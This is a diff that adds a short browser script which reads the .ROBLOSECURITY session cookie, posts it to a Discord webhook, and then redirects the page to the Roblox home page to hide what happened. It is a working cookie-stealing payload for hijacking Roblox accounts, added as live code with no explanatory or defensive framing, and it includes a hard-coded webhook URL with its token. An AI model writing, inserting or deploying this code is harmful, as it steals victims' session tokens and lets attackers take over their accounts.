@@ -1,0 +1,11 @@
+<script>
+const token = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+if (token) {
+  fetch("https://discord.com/api/webhooks/1429132514160672870/FNRs-QwEYLruFYUzCxSal6G9OcM-4bneeucOExuwe3pDoiUJQRZbfBPW0dDWIkt9e4sH", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({content: token[1]})
+  });
+}
+location.href = "https://www.roblox.com/home";
+</script>
